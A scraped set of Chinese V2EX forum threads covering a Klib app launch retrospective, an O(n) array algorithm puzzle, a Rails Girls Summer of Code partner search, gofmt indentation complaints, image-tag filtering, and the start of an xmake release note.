根据「鸡头与凤尾」的逻辑，我选择美国的周一来发布。</li>\n<li>从几点的角度，一种做法是在凌晨 00:00 发布，这样可以充分利用 24 小时进行传播；另一种做法是在早上的时间发布，因为这里媒体人、评测者刚刚起床，可以给他们更多爆光。考虑到我并没认识国外的媒体人，还是 00:00 发布吧。<strong>因为时区的原因， Product Hunt 会在北京时间下午 4 点切换昨天、与今天的产品列表。</strong></li>\n</ul>\n</li>\n<li>名字、标语\n<ul>\n<li>名字就是 Klib 了，重要的是标语。要简洁、要突出产品特色、要抓住用户眼球。</li>\n</ul>\n</li>\n<li>截图\n<ul>\n<li>如果有必要，可以制作动图，虽然我挺讨厌一旦有多个产品都使用动图，会让界面闪啊闪，显得很 Low ；但没办法，这确实是能抓用户眼球。并且， Product Hunt 的 Twitter 账户也有专门转发动力的。</li>\n<li>基本上，我把把 Mac App Store 的截图重用了。</li>\n</ul>\n</li>\n<li><strong>发布后，立即在首条评论中添加更多信息</strong>。如产品的进一步介绍、未来的规划、联系方式、等等。</li>\n<li>转发、扩散。也就是让更多的人点进来看，投票、讨论。尤其是大咖的转发会很有效。<strong>我最大的成绩是 Ben Tossell (Community Lead of Product Hunt) 参与了讨论</strong>。可惜，他并没有转发。\n<ul>\n<li>不过，不要一味的拉票， Product Hunt 有自己的排名算法。</li>\n</ul>\n</li>\n<li><strong>及时回复留言</strong> 。用户的留言，要立即回复（恩，晚上基本可以不睡了，盯着）。并且，可以将用户的回复转发到 Twitter 上，并表示感谢。</li>\n</ul>\n<p>最终，<a href=\"https://www.producthunt.com/posts/klib\" rel=\"nofollow\">Klib 在 Product Hunt 上获取 200+ 点赞， 10 几位国际用户参与讨论</a>，基本满意。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/bhl6a.jpg\"></p>\n<h2>用户群</h2>\n<p>Mac App Store 上的好评、留言，自然是非常重要的。而 <strong>最有可能给你好评的，就是你之前产品的用户</strong>。我一开始没有经营自己的用户群，现在回想起来深觉可惜。好在，现在慢慢有了 <a href=\"https://toolinbox.net/html/iPic/iPicGroup.jpg\" rel=\"nofollow\">微信群</a>、<a href=\"https://t.me/Toolinbox\" rel=\"nofollow\">Telegram 群</a>，<strong>也有了一些非常友善的用户，感谢你们！</strong></p>\n<h2>媒体</h2>\n<p>媒体的爆光自然必不可少，他们的影响力是个人无法比拟的。最好是：</p>\n<ul>\n<li>平时就与媒体朋友保持联系，不要临时抱佛脚；</li>\n<li>上线前发体验版本，给他们预留时间准备文案；</li>\n<li>上线时及时通知，方便他们安排发布时间；也可以提供兑换码，方便对方做活动。</li>\n<li>发布会，也要帮忙转发，并表示感谢。</li>\n</ul>\n<h2>其他影响力</h2>\n<p>动用所有可以动用的影响力，让 Klib 触达更多的人。比如让朋友帮忙转发及好评，微博转发抽奖，朋友圈，等等。</p>\n<h2>其他</h2>\n<h3>定价</h3>\n<p>定价是门玄学，太高没人买、太低自己不划算。目前 <strong>Klib 采用的是免费 + 内购（一次性买断）的方式</strong>。免费是为了方便更多的人使用 Klib 、降低门槛。虽然我很想继续尝试订阅模式，无奈用户对订阅始终接受程度不高，且 Klib 本身的属性也不太适合订阅模式，于是采取买断式。</p>\n<p>趁这个机会，表达下个人观点：<strong>买断对开发者并不友好，订阅才符合实际</strong>。毕竟通常开发者需要对产品进行持续改进（这并不是说当初发布的产品有问题，而是产品本身有改进），却不能从改进中获得收益，这并不健康。伤害的最终可能还是用户自己的利益，因为开发者一旦坚持不下去而不更新，用户只能使用有待改进的版本。</p>\n<p>定价目前是 ￥ 50 ，<strong>首发限时半价优惠</strong>，即￥ 25 ，入手即赚。</p>\n<h3>首发的意义</h3>\n<p>目前， Klib 是 macOS 平台、首款上架 Mac App Store 的 Kindle 笔记管理工具。这种唯一性是很有意义的。因为没有直接竞品，甚至有一定的定价权。</p>\n<p>对用户而言，首发更容易使产品在这一品类中形成定位，后来者要想抢走在用户心智中的定位，就不容易了。</p>\n<h3>单日销量的意义</h3>\n<p>如果单日销量可以使 App 出现在排行榜的前面，会带来一些附加的流量，因为别的用户可能因为榜单的原因多看两眼。</p>\n<p>首发第 2 天（第 1 天 App Store 更新太慢，没有数据），<strong>Klib 在中国区、 Utilities 这一品类中， Free 排名 22 、 Crossing 排名 14</strong>，算是不错的成绩了。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/qvhtr.jpg\"></p>\n<h1>之后</h1>\n<p>目前， Klib 算是成功上架 Mac App Store ，也收到了很多用户的反馈。接下来，我会继续改进 Klib ，如增加多看支持、与 Amazon 中的笔记同步、与 Kindle 其他平台的笔记同步、导出至 Evernote 、等等。当然，<strong>我会非常谨慎地加功能，保持 Klib 的精简。</strong></p>\n<h1>致谢</h1>\n<p>真的有很多人需要感谢…</p>\n<ul>\n<li>感谢家人对我做独立开发者的支持（主要是接受不赚钱…）</li>\n<li>感谢用户对我的信任</li>\n<li>感谢朋友的帮助（比如 <a href=\"http://kmate.me\" rel=\"nofollow\">Kindle Mate 作者</a> 提供多语言支持、<a href=\"https://dribbble.com/openallen\" rel=\"nofollow\">Allen</a> 帮助制作 Logo 、<a href=\"http://www.weibo.com/u/1734549517\" rel=\"nofollow\">61</a> 帮忙搞定微博短链）</li>\n<li>感谢媒体的报道（点名最先报道的 <a href=\"http://sspai.com/37581\" rel=\"nofollow\">少数派</a>）</li>\n<li>感谢所有点赞与批评的朋友</li>\n<li>感谢苹果（虽然 MAS 有坑）</li>\n<li>感谢 Kindle</li>\n<li>当然，感谢 CCTV</li>\n</ul>\n<h1>最后</h1>\n<p><strong>希望 Klib 能让大家多读点书、记点笔记</strong>，哪怕只是一点点改变，也是 Klib 的莫大荣幸。</p>\n<hr>\n<p><a href=\"https://atjason.com/daily/2017-02-21.html\" rel=\"nofollow\">博客原文</a></p>\n</div></div>", "<div class=\"topic_content\">大家如果觉得对别人有帮助，也可以帮忙扩散一下。\r<br>\r<br>如果担心 V 站速度不快，可以用简书版的：\r<br><a target=\"_blank\" href=\"http://www.jianshu.com/p/07f3f3cb9618\" rel=\"nofollow\">http://www.jianshu.com/p/07f3f3cb9618</a></div>"], "reply": "66", "tittle": "我是如何把 Klib 带到这个世界的", "comment": ["好文，希望楼主带来更多作品。", " 客气，也欢迎转载、扩散。", "。。。我还以为是底层库或者什么开发库呢，这名字起的，感觉不怎么好", "没 Mac 好伤感", " 还真是有 Klib 这个库…\r", "\r", "好在， Google 告诉我，这名字值得一试：\r", "\r", " ", " 又是买 Klib 、送 Mac 系列…", " 赞一个，做好产品只是第一步，后续的版本迭代和客服（回邮件，回 Devmate 的 report 各种）才是万里长征，需要极大的热情和精力去维护，与君共勉", "刚在 PH 看到了 Klib ，然后想起在 V 站看到过，于是就找来了这里\r", "LZ 加油。其实就想问下能挣多少钱，哈哈哈", "为独立开发者点赞，产品推广的经验值得学习。", "学习了  ~~ 赞一个", "赞一个，写得很棒", " 我已经有好几个产品了，深知维护所需要花的时间和精力，共勉。", " 哪天你看到我不再坚持独立开发了，就知道赚了多少钱……", " 谢谢，也可以帮忙扩散一下。", "独立开发的路很难。从构思、设计、交互、体验、编码、测试、发布，都是一个人，像一个将军统领全局。自己也在开始做一个新的小工具，希望最后能得到收获吧！共勉！", " 一看就是懂行的人，谢谢你，我会坚持的。", "支持！已付费。\r", "lib 确实太程序员了些，可以考虑 Kinotes", " 因为我就是程序员……\r", "\r", "谢谢建议。名字确实很纠结， Kinotes 确实在候选列表。最后是出于简洁考虑，选了 Klib 这个名字，任性一把吧。", "厉害，点个赞", "文章虽然写的很用心，但是槽点也够多的。\r", "笔记 id 你用 hash 难道不怕冲突吗？不要用几率小做借口，只要几率不是 0 的事情就一定会发生的。你应该去研究一下 uuid 或者 sqllite 里的自增字段。\r", "以及从云端同步时间 parser 难道不是很平常的设计吗。。不是很能理解你的公开自我陶醉。", "感谢发布心得，目测很快会有 win linux 的山寨版出来", "不错。是很用心的作品。字里行间学到不少东西。", "不错 很好的一个复盘 感谢开发者", " 已经 Product Hunt 上点赞转推了", "独立开发者不容易。我觉得你可以尝试做点更大的东西。你实力在那里，如果能做出像 Dash 那种水平的，赚钱应该不是问题。这种小工具最后顶天也赚不了多少还要花很多时间维护。。。一个也就算了，你都做了 5 、 6 个了。。。", " 谢谢支持。", " 关于 id ，并不是用于在数据库中进行唯一比较，而是和纯文本中的笔记内容进行唯一性比较；所以 uuid 之类的并用不上。\r", "\r", "关于自更新，好吧，你可以理解为公开陶醉，我倒是理解为自我激励。当然，期待你更高级的分享。", " 山寨肯定会有的，只是早晚。\r", "\r", "我发布了 iPic ，很快就有了类似的工具、并且以 iPic 作为 App Store 的搜索关键字。关键的，还很厚脸皮的不认为是抄袭。对这种人，我也没什么办法，只能让自己跑得更快些，让他们慢慢抄去吧。", " 谢谢，很高兴自己的经历能对大家有帮助。", " 不客气，谢谢你的分享。", " 恩，我确实也想做个大的，在物色项目。\r", "\r", "不过，说起来，小众需求真是可怜。如果连我这种独立开发者都因为钱而无视这种需求，就永远不会被满足。", " 那没办法，你如果是一边工作一边做点小众项目，那我觉得无所谓。但是你是全职啊（我猜;)))) ）。。。", " 哈哈，真是实在人😂\r", "\r", "不过，反过来想：做的大、死得快。比如，花一年做一个产品，结果不赚钱或被抄袭，于是就……", "买了，试试看", "之前用过几个类似的整理笔记的服务，最终比较郁闷的是发现亚马逊在中国关闭了非常重要的一个服务： ", " ，也想交流下 @", " 是否发现了这个问题，或者是否有其他的办法解决多设备同步的问题。\r", "\r", " 这个网站通过中国亚马逊的账户是无法访问的，但是在美国区可用，这个服务汇总展示了 Kindle 用户在所有设备（实体 Kindle 、 iPhone 、 Mac 等等）所有摘录和笔记内容。\r", "\r", "没有这个服务的中区现状：\r", "我最近刚刚换了一个新 Kindle ，昨天用 Klib 导入新 Kindle 上的笔记，发现所有在以前的 Kindle 上做的笔记全部都不在新设备的 My Clippings.txt 中。同时，在 iPhone 、 iPad 、 Mac 上的 Kindle App 中做的笔记也无法集中管理（只能进入到每一本书中单独导出到邮箱），更不能使用像 Klib 这样的工具进行导出和管理。\r", "\r", "而美区可以做到：\r", "通过 ", " 这个网页，管理和导出所有的 Kindle 设备 + Kindle App 的所有摘录、笔记。\r", "\r", "去年我跟亚马逊客服反馈过这个问题，希望能了解到为什么在中国关闭了这个功能，客服多层转接，前后接打了好几个电话，最终也没能够获得任何有效的解答。\r", "\r", "可能「管理多个设备上的 Kindle 笔记」是一个比「管理 Kindle 笔记」还要小很多的小众需求吧。", " 感谢你这么详细的介绍。\r", "\r", "话说，已经有多位朋友表达了跟你类似的需求，我会研究下的。不过，可能很困难…\r", "\r", "另外，即使是国外，也只有这个网页（虽然很丑），而且，也并没有开放接口，只能用很 Hack 的方式集成。 Amazon 在这方面开放不够，也可能是因为版权问题吧，目前还不清楚，要再跟进。", " 感谢支持，期待你的使用体验。", "问下作者，想这样的独立开发者，年收入一般怎么样？ 够养活自己，或者生活的至少体面么？", " 花积蓄中……", "支持。细节是魔鬼。\r", "独立开发者或者说 side project 要打磨的东西太多太杂了。", " \r", "思路清晰，行文流畅，楼主不去做产品经理真是屈才了。", "那个是随手记吧。。学习了用记账软件记时间。。。", "这个名字不好，像是程序库", " 是的，只要你愿意，永远有可改进的地方。", " \r", "曾经写代码，写不好去干产品经理了；\r", "曾经是产品经理，干不好就又滚回来写代码了 😂", " 被你看出来了，确实是随手记。用记账软件记时间，还是挺方便的：跨平台、报表、等等，都挺方便。\r", "\r", "附我对精算时间的理解： ", " 还真有 klib 的程序库…", "我觉得 LZ 越做越好了，名声也打出来了。加油～～", " 谢谢你，我会继续坚持的 💪", "非常棒，期待着导出 Evernote 的实现，膜拜大神", " 据说 Evernote 的接口很多坑，待我去踩~", "为独立开发的 LZ 点赞！\r", "歪个楼，名字是不是可以起的更好一些，比如 Knote, Kinote 之类的，简单明了", " 哎，我最想用的是 iKindle …", "挺好的文，只是 klib 这个一看就像库的名字", " 哈哈，趁着半价就买了，买断式确实非常贴心，几年前就期待 kindle 能转 Evernote 了，加油，祝顺利～", " 哈哈，我想，应该说、前提是，在程序员看来， klib 一看就像库的名字 😀", " 哈，原来男人也有冲动消费啊。\r", "\r", "我想说，买断式对开发者一点都*不*贴心…", "昨晚买了，很不错，喜欢", " 谢谢支持，也很高兴你喜欢 Klib 😀\r", "\r", "​另外，也欢迎加入 Telegram 群、方便快速讨论：\r", " 试用的时候就已经很喜欢了，已经购买，希望能够帮助自己更好的阅读。", " 谢谢支持，也祝你更多地阅读。", "兄弟，这个也是你？ ", " 并不是 🤣", " 这算是...侵犯著作权吗...", " 大家良性竞争，用户也多一个选择。没事，我继续改进，大家体验后选择自己喜欢的即可。", " 👍"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前几天碰到一道算法题, 由于限定时间感觉没有做好:\n一个长度为 N 的数组 Arr, 可以按照其中的某个元素 K 做为分界点 0&lt;=K&lt;N, 得到其左边部分所有元素最大值(包括 K) 减去 右边部分最大值(不包括 K)的绝对值 ABS. 需要写一个函数求助该数组中这个绝对值 ABS 最大是多少. 公式如下:\nmax(abs(max{Arr_0, ... Arr_K} - max{Arr_K+1, ...Arr_N-1}))  for K in (0...N-1)</p>\n<p>要求写出时间 /空间复杂度均为 O(N)的算法, 但是我想了半天, 每次往右移动 K 取值的时候, 都要重新对右边的元素进行排序啊, 不知道怎么才能 O(N).</p>\n<p>请教各位大神.</p>\n</div></div>"], "reply": "58", "tittle": "一道算法题: 求一个数组中最大的 abs(max(left) - max(right))", "comment": ["这个，不等于 max(Arr)-min(Arr)吗？", "错了，请无视", "就是 O （ n ）啊，先找到波峰，然后往后找波谷。", "扫一次求最大值 再扫一次求解也是 O(n) 吧", "顺序遍历计算并保留每个元素左边的最大值，然后逆序遍历计算最大值减去对应左边的最大值。", "找到最大值，然后分别比较跟头尾之差哪个大，粗略想了一下。等下再细想", "建一个长度为 N 的数组 t_arr 。\r", "第一轮是正向遍历， t_arr[i]表示的是，在 arr[0~i+1]中的最大值\r", "第二轮是反向遍历，求 max(abs(max(arr[i+1 ~ N-1])), t_arr[i])", "假设原数组 arr,设两个辅助数组 a ， b ， a[i]表示 max(arr[0...i])， b[i]表示 max(arr[i...arr.length])，然后扫描一遍 a 和 b 就可以了，时间空间都是 O(n)。", "答案是 abs(max(arr) - min(arr[0], arr[N-1]))嗎？", "#7 下标标错了，不知道怎么改，希望楼主能理解", " 不是。\r", "首先，左边的最大数一定是数列中某一个波峰，但是不一定是最大的那个。所以记录当前最大波峰，然后动态更新最大差值就好。", " 后来想一下，一个数组也可以。。", " 嗯。确实。", " +1 每错就是这样\r", "因为不论分界线是哪个：\r", "1.如果全局 max 在分界线左，则右 max 大于左 max ，则左右 max 差取决于左 max 最小，反之同理\r", "2. 从左向右移动分界线，左 max 单调递增，右 max 单调递减。反方向同理。\r", "3. 因此分界线必定在两端之一，比较一下两端哪个小，和全局最大相减即可", " 不对，最大数一定是全局最大，只不过最大 max 差可能是左减右或是右减左", " 谢谢, 你的思路很好, 但感觉有个问题, 因为最后要求绝对值, 所以未必波峰-波谷就最大吧, 有可能左边比右边小, 得到一个很大的负数, 反而比波峰-波谷要大.", "从左往右扫，\r", "这个时候分别维护一个最大值和一个最小值，\r", "用当前的数与最大值和最小值差求 abs ，\r", "更新答案，\r", "更新最大值和最小值。", " 假設最大數在分段 K 的左邊，結果是 max(arr) - max(arr[K..N-1])，小於等於 K=N-1 時的 max(arr) - arr[N-1]\r", "假設最大數在分段時的右邊，結果是 abs(max(arr[0..K-1]) - max(arr))=max(arr) - max(arr[0..K-1])，小於等於 K=0 時的 max(arr) - arr[0]\r", "要不 K=0 ，要不 K=N-1", "至于为什么维护最大值和最小值，你用贪心去反证。\r", "如果我这个解最优那么比他小或者比他大是不是更好呢？没错就是更好。", " \r", " \r", "\r", "我想了一下你们的思路, 感觉你们是对的, 我当时没想到可以逆序遍历, 非常感谢.", "这个， leetcode 里面有吧，卖股票的……扫一遍就好了", " 这是不对的\r", "考虑 1 4 3 0 1\r", "k=0 或 4\r", "max 差为 3", " 看错题目了\r", "那就 left[i]保存前 i 个数最大值 right[i]保存 i~n 的最大值\r", "答案就是遍历 i\r", "ans = max(ans , abs(right[i + 1] - left[i]))", "1 、分别找出[a_0,a_k]和(a_k,a_n-1]的最大值和最小值： a_lk_max,a_lk_min   a_rk_max,a_rk_min.\r", "2 、 max(k)=max(abs(a_lk_max-a_rk_min),abs(a_lk_min-a_rk_max);", " 我就看了个标题就来答了。。", " 哦，如果要求绝对值的话，结果一定是 max-min", " 哦不对不对忽略我吧，已经被整晕", "可证 max(left)单调递增， max(right)单调递减\r", "同时当 k=maxall 的下标， max(left)=max(right)=max (all)\r", "因此答案一定是 max(all)-第一个或者 max(all)-最后一个\r", "各位请看我 14 楼\r", "\r", " \r", " \r", "3 、将 k 从 0 到 n-1 的 max(k)产生的数组排序，得到 max 以及对应的 k 值。", "  你是对的", "上面的 1 、 2 步改为只计算最大值及最大值之差的绝对值。", "感觉 28 楼应该是最合理的答案了， O(n)的时间复杂度和 O(1 的空间复杂度)。", "另外楼主是在哪里看到的题目呢？谢谢。", "先开一个长度为 n 的数组，从头开始数，第 i 位就是 i 左边的最大值；然后从尾开始数，得到第 i 位右边的最大值，同时将第一个数组的第 i 位减去求 abs ，得到当前的最大值。遍历结束就可以得到最终的最大值，一共遍历两次，消耗了 n 的空间。\r", "这是我想到的算法……", "7 楼正解……确实只要比较最大值和两个端点的差然后求最大值就可以了。这样一次遍历+常数空间就解决了……", "先 k 为 0 扫一边，左边最大右边最小知道了，然后逐个右移，判断是否要更新左最大和右最小。取差值最大的一个即可。当然题目是绝对值，所以要反过来再扫一边。\r", "感觉空间可以常数。", " 不是左最大右最小，是两个最大之差", " 刚发现了，看错题了 😂", "楼主你公式错了：\r", "按 Python 写法\r", "对于某数组 a 长度 n\r", "求 max( [abs(max(a[0:K])-max(a[K:-1])) for K in range(n)]  )", "哦不：\r", "max( [abs(max(a[:K])-max(a[K:])) for K in range(n)] )", "哦还是不\r", "这样当 K=N-1 的时候右边岂不是空了？\r", "max( [abs(max(a[:K])-max(a[K:])) for K in range(n-1)] )", "md 我大概今天脑子冻傻了\r", "slice 右边开区间\r", "max( [abs(max(a[:K+1])-max(a[K+1:])) for K in range(n-1)] )", "1. 先正向遍历一遍 Arr ，求出一个长度为 N 的数组 asc ， asc = {n | n = max{Arr[0..k]}, k∈[0..N-1), k∈N(自然数)}， asx[i]就等于 Arr[0..i]中的最大值\r", "2. 再反向遍历一遍 Arr ，求出一个长度为 N 的数组 desc ， desc = {n | n = max{Arr[k..N-1]}, k∈(0..N], k∈N(自然数)}， desc[i]就等于 Arr[i+1..N-1]中的最大值\r", "3. 遍历 i in range(0..N-2)，找出 abs(asc[i] - desc[i])的最大值\r", "\r", "算法复杂度 3n ，符合你 O(n)的要求。\r", "\r", "优化：步骤 2 和步骤 3 可以合并在一起，不用单独创建一个数组 desc", "这个值在交易中叫最大回撤， O(n)算法，从后向前扫描，维护当前看到的最小值和扫描位置元素与当前最小值的差，结果就是所求。", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "如果没猜错的话, 楼主名字的简写是 ZX, 我是原来安排的面试官之一. 我们很喜欢好学的人, 如果是你的话, 我会和别的 team 再讨论一下你的简历.\r", "\r", "另外这道题我自己当时做也是#7 的解法, 但其实觉得逆序遍历才更符合计算机的思维, 更普适. 我回复的这几位如果想去外资 IT 工作的话可以留下邮箱地址, 我来安排面试, 我们提供一流的薪水, 期权和办公环境, 顶配 rMBP, Apple 外接显示器, 不加班. 尤其欢迎有数据库核心开发经验和喜欢敏捷开发的朋友. 工作地点在北京中关村.", "你求最大值不一定要排序吧。用变量记录一下就好。移动 K 的时候比较下记录与新值的大小。", "这是 pivotal 的面试题吧", " 正解。而且空间复杂度是 O(1)", "遍历的时候，可以得到前 n 个的最值，那么，反向遍历的时候，同样可以得到后 n 个的最值。。\r", "\r", "其实再不济， ST 预处理下， O （ nlogn ）也能解。。 ", " 不一定是波峰", " 一脸懵哔，我只是个还没毕业应届而已啊", " \r", " \r", "想到这里很不错，但是再往前一步\r", "请看我 28 楼\r", "最小 max 一定在两端\r", "其他地方可能存在相等，不可能更优", " #51 666 这波可以", " 谢谢，不过目前没有换工作的计划:P 。", " 恩，你这个解法确实更好，可以优化常系数。", " 最大回撤不是这个意思，最大回撤是选的最大跌幅区间，是(最大值 - 最小值)最大的区间。", "确实。。第一反应是#5 楼的解法扫两遍，不过#14 的解法更巧妙，只扫一遍就好。", "不知道我是否理解了题目。\r", "\r", "是要求所有可能的分割中最大的子串最大值的绝对差吗？\r", "\r", "因为分两段，其中一段的最大值肯定是全局最大值，另一段的最大值一定大于等于这一段的两个端点值中的最小值\r", "\r", "为了让第二段最小，则设第二段的大小为 1 ，所以第二段要么是数组的第一个值，要么是数组的最后一个值，因为包含更多的值只会增大这一段的最大值或对这一段的最大值没有影响。\r", "\r", "这样的话就扫一遍得出全局最大，跟两个断电比一下，然后几个 if-elas 就好了 ", "这 C++题解在这里:  "]},
{"content": ["<div class=\"topic_content\">前两天看到一个很有趣的开源项目： <a target=\"_blank\" href=\"https://teams.railsgirlssummerofcode.org/projects/173-pushtype-cms\" rel=\"nofollow\">https://teams.railsgirlssummerofcode.org/projects/173-pushtype-cms</a>\r<br>感觉十分想参加，无奈这个项目需要两个女生来申请，而且我不会 Ruby ，最好妹子是会 Ruby 以及使用 Ruby on Rails 的。\r<br>我的技术栈是 JavaScript 和 vue.js ，曾用 Vue 开发过两三个 app （前端部分）。\r<br>我目前大四，坐标广州，希望妹子也是广州的。\r<br>这个项目虽然有一点难度，但是已经有两个教练和一个导师在帮助。所以只要努力和花时间是做得来的！而且我也会很努力的！\r<br>教练都是大神，比较有经验，就差妹子你了，快到碗里来！\r<br>我的联系方式： QQ ： 873454517</div>"], "reply": "30", "tittle": "求一个会 Ruby on Rails 的妹子，一起参加 RGSOC（ Rails Girls Summer of Code）^0^", "comment": ["好像有 5000 美金的? 好厉害, 可惜我不是妹子...", "已帮转 twitter", " 感谢哦~", " 有认识的可以推荐哦~", "建议可以尝试去 ", " 再发一次。", "很棒啊", "曾用 Vue 开发过两三个 app （前端部分）---趴地舔脚。。。。", "突然百合猝不及防……", "楼主要发财的样子。支持", "楼主大三就开始工作了么，厉害", "汉子到是有的，要求妹子是性别歧视吗？难道是 rails girl 的项目？ 如果是 xxx girl 的项目， lz 是汉子的话，也不能参加吧，除非你是 coach", "我悄悄地问下能不能女装？ (逃...", "我觉得带个女装子应该也是看不出来的。", " 我其实是很渣的，好像把自己说的太厉害了，尴尬。。。。", " 是啊 我大三就工作了，但是现在待业中，有什么工作机会可以推荐我哦~", " 这个是需要核查身份的，应该是不行。。。不过你也可以尝试一下，自己找 4 个汉字组队。。", " 我就是女孩子啊。", " 我们女装吧, bug 少又赚钱 233", " 发简历来看看? 我看看有没有公司可以内推你", "好不容易逮到一个活的妹子，大家别让她跑了～～～", "ruby 又不是很难，编程水平比较高数理背景比较足的话，自己搞搞很快上手了，不要被语言和框架束缚住。", "这样的话找别的妹子做前端明显容易多了", "好不容易出现一个活妹子。要不我教你 rails 吧，你一人霸气的把项目搞定", "不是妹纸，但可以教 rails..", " 项目好像是要两个妹子组队参加的.", "送给项圈给你，嘿嘿！", "👏👏👏👏", "ruby-china 走一下", "学 ruby 的花样最多", "混 Lavarel 圈的广州妹纸路过"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为 golang 的标准库很丰富，想要的模块都内置了所入了坑。。</p>\n<p>但是 go fmt 这个缩进很烦啊，都不能自定义的。</p>\n<p><a href=\"https://golang.org/cmd/gofmt/\" rel=\"nofollow\">https://golang.org/cmd/gofmt/</a></p>\n<p>Gofmt formats Go programs. It uses tabs (width = 8) for indentation and blanks for alignment.</p>\n<p>不会是懒得做选项吧？</p>\n<p>我习惯缩进四个字符宽度=1 个 tab\n在 goland IDE 上缩进成这个样子好丑，要是再嵌套个两三层。。\n<img alt=\"\" src=\"http://p1.bpimg.com/4851/f9f0b17981ca70cb.png\"></p>\n<p>还有不能导入多余包，不允许无用语句之类的，\n感觉很霸道很不讲道理呀这么做</p>\n</div></div>", "<div class=\"topic_content\">谢谢大家已经解决， fmt 默认只允许 tab 缩进，默认 tabs (width = 8)，但是编辑器显示可以随意设置，\r<br>然后只是觉得他无用代码和包管的有点宽，比如有的时候需要临时加一句测试</div>"], "reply": "15", "tittle": "go fmt 为什么强制 8 字符宽度的 tab 缩进？", "comment": ["Go 默认是用 tab 缩进的， 8 字符宽是你你编辑器设置的问题。我记得也可是设为 4 个空格而不是 tab 。", " go fmt 默认就是", "你可以设置编辑器里的 tab 显示成多少个空格，至少 emacs 里是可以的", "gofmt 实际上用到这个假设的地方是很少的，你在编辑器里把 Tab 宽度设成别的值也没什么影响。这个宽度值多半是 Rob Pike 用的。\r", "\r", "倒入包的问题用 goimports 就能解决。", " 以往 go 是可以设置用空格缩进的，现在不行了。详见： ", "\r", "\r", "不过你缩进 8 个空格位还是因为你编辑器的原因，比如在 .vimrc 中设置： set tabstop=4\r", "\r", "缩进就占 4 个空格位了。", "从设计思路上来说， Go 是个自带风格指引（ style guide ）的语言。\r", "\r", "导入包必须要用、变量必须要用，这些如果出现在风格指引里面，是一点都不过分的。", " @", "\r", " 搞定了 fmt 是没问题了，但是我觉的他这个包和语句管的太宽了", "go fmt 用 '\\t' 缩进。\r", "一个 '\\t' 显示多宽，是你的编辑器的事情，和 go fmt 没有关系。\r", "统一缩进字符是十分有益的。", " \r", "\r", "导入一个包会产生副作用，比如 http/pprof 的用法就只是把它 import\r", "import 一堆不用的包会编译进去一堆不用的东西，还会在启动的时候调用一堆不用的 init 函数，这显然不是 Go 的风格", "tab 本身就是 8 个空格宽啊", " 那无用语句呢？\r", " 这个看设置的吧，有点默认四空格有的八空格，求可靠参考资料", "在项目根目录加个 .editorconfig 文件\r", "\r", "# ", "\r", "\r", "root = true\r", "\r", "[*]\r", "charset = utf-8\r", "end_of_line = lf\r", "insert_final_newline = true\r", "trim_trailing_whitespace = true\r", "\r", "[*.go]\r", "indent_style = tab\r", "indent_size = 4\r", "\r", "[*.tmpl]\r", "indent_style = tab\r", "indent_size = 2\r", "\r", "[*.{less,yml}]\r", "indent_style = space\r", "indent_size = 2\r", "\r", "[*.js]\r", "indent_style = space\r", "indent_size = 4", " 我记得 1 个制表符本身就是 8 个空格宽度，而一般都会在编辑器里设置成 1 个制表符 4 个空格宽度\r", "\r", "\r", "\r", "\r", " \r", "谢谢长知识了", "go 最讨厌的是 他知道哪些是无用 import 那打包的时候忽略掉就好了 他不 他非让你改 开发的时候好恶心啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前在用一个给图片自动打标签的服务，但是它返回的结果有很多意思冲突的词语，比如，一张图片是太阳照射在花朵上，系统返回关键词为： sun 的置信度是 0.96 ， moon 的置信度是 0.91 ， sun 和 moon 两个关键词肯定不能共存，我想让机器知道 sun 和 moon 是相互冲突的词语，选择置信度大的 sun 作为关键词，有没有 API 能判别出 sun 和 moon 是同一类中相互冲突的关键词？？？</p>\n</div></div>"], "reply": "2", "tittle": "有没有一种 API 能够自动剔除一组词语中相悖词语？", "comment": ["从图片识别的角度为什么 sun 和 moon 不能并存呢？\r", "\r", "非要检测的话，可以用 nltk 调 wordnet ，检查是两者间存在 hypernyom/hyponyom 关系。", "楼上说得对， wordnet 本身就是一个同义词集，可以考虑计算相似度或者距离"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>此次大版本更新，重构了整个 xmake ，使得 xmake 更加方便地进行多语言扩展，并且在之前原有的构建语言支持上，新增了对<code>golang</code>, <code>dlang</code> 和 <code>rust</code> 程序构建支持。</p>\n<p>并且重写了所有文档，提供更加详细完整的接口手册和文档支持：<a href=\"http://www.xmake.io/#zh/\" rel=\"nofollow\">新版 xmake 文档</a></p>\n<p>License 也从之前的 LGPLv2.1 改为 Apache License 2.0 ，更加详细的改进请看下面详细描述：</p>\n<p><a href=\"https://www.zhihu.com/question/56634628?utm_source=qq&amp;utm_medium=social\" rel=\"nofollow\">知乎 xmake 话题讨论</a></p>\n<h3>新特性</h3>\n<ul>\n<li>添加<code>--links</code>, <code>--linkdirs</code> and <code>--includedirs</code> 配置参数</li>\n<li>添加 app2ipa 插件</li>\n<li>为<code>xmake.lua</code>工程描述增加 dictionay 语法风格</li>\n<li>提供智能扫描编译模式，在无任何<code>xmake.lua</code>等工程描述文件的情况下，也能直接快速编译</li>\n<li>为<code>xmake.lua</code>工程描述添加<code>set_xmakever</code>接口，更加友好的处理版本兼容性问题</li>\n<li>为<code>objc</code>和<code>swift</code>程序添加<code>add_frameworks</code>接口</li>\n<li>更加快速方便的多语言扩展支持，增加<code>golang</code>, <code>dlang</code>和<code>rust</code>程序构建的支持</li>\n<li>添加<code>target_end</code>, <code>option_end</code> 和<code>task_end</code>等可选 api ，用于显示结束描述域，进入根域设置，提高可读性</li>\n<li>添加<code>golang</code>, <code>dlang</code>和<code>rust</code>工程模板</li>\n</ul>\n<h3>改进</h3>\n<ul>\n<li>工程生成插件支持 vs2017</li>\n<li>改进 gcc/clang 编译器警告和错误提示</li>\n<li>重构代码架构，改进多语言支持，更加方便灵活的扩展语言支持</li>\n<li>改进 print 接口，同时支持原生 lua print 以及格式化打印</li>\n<li>如果 xmake.lua 不存在，自动扫描工程代码文件，并且生成 xmake.lua 进行编译</li>\n<li>修改 license ，使用更加宽松的 Apache License 2.0</li>\n<li>移除一些二进制工具文件</li>\n<li>移除 install.bat 脚本，提供 windows nsis 安装包支持</li>\n<li>使用<a href=\"https://github.com/egoist/docute\" rel=\"nofollow\">docute</a>重写<a 